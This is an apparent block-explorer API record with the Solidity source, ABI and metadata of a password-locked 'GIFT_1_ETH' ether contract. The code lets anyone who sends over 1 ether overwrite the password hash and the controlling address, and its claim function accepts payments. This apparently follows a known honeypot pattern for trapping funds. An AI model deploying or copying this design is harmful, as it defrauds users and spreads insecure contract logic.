{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.4.19;\r\n\r\ncontract GIFT_1_ETH\r\n{\r\n    bytes32 public hashPass;\r\n    \r\n    bool closed = false;\r\n    \r\n    address sender;\r\n \r\n    uint unlockTime;\r\n \r\n    function GetHash(bytes pass) public constant returns (bytes32) {return keccak256(pass);}\r\n    \r\n    function SetPass(bytes32 hash)\r\n    public\r\n    payable\r\n    {\r\n        if( (!closed&&(msg.value > 1 ether)) || hashPass==0x00 )\r\n        {\r\n            hashPass = hash;\r\n            sender = msg.sender;\r\n            unlockTime = now;\r\n        }\r\n    }\r\n    \r\n    function SetGiftTime(uint date)\r\n    public\r\n    {\r\n        if(msg.sender==sender)\r\n        {\r\n            unlockTime = date;\r\n        }\r\n    }\r\n    \r\n    function GetGift(bytes pass)\r\n    external\r\n    payable\r\n    canOpen\r\n    {\r\n        if(hashPass == keccak256(pass))\r\n        {\r\n            msg.sender.transfer(this.balance);\r\n        }\r\n    }\r\n    \r\n    function Revoce()\r\n    public\r\n    payable\r\n    canOpen\r\n    {\r\n        if(msg.sender==sender)\r\n        {\r\n            sender.transfer(this.balance);\r\n        }\r\n    }\r\n    \r\n    function PassHasBeenSet(bytes32 hash)\r\n    public\r\n    {\r\n        if(hash==hashPass&&msg.sender==sender)\r\n        {\r\n           closed=true;\r\n        }\r\n    }\r\n    \r\n    modifier canOpen\r\n    {\r\n        require(now>unlockTime);\r\n        _;\r\n    }\r\n    \r\n    function() public payable{}\r\n    \r\n}","ABI":"[{\"constant\":false,\"inputs\":[{\"name\":\"hash\",\"type\":\"bytes32\"}],\"name\":\"SetPass\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"pass\",\"type\":\"bytes\"}],\"name\":\"GetGift\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"hash\",\"type\":\"bytes32\"}],\"name\":\"PassHasBeenSet\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"hashPass\",\"outputs\":[{\"name\":\"\",\"type\":\"bytes32\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"pass\",\"type\":\"bytes\"}],\"name\":\"GetHash\",\"outputs\":[{\"name\":\"\",\"type\":\"bytes32\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"Revoce\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"date\",\"type\":\"uint256\"}],\"name\":\"SetGiftTime\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}]","ContractName":"GIFT_1_ETH","CompilerVersion":"v0.4.19+commit.c4cbbb05","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://9a7276d2da47b2ca3ef9b3ae08a786b8fc26b83b33708cf69cf2753940158a30"}]}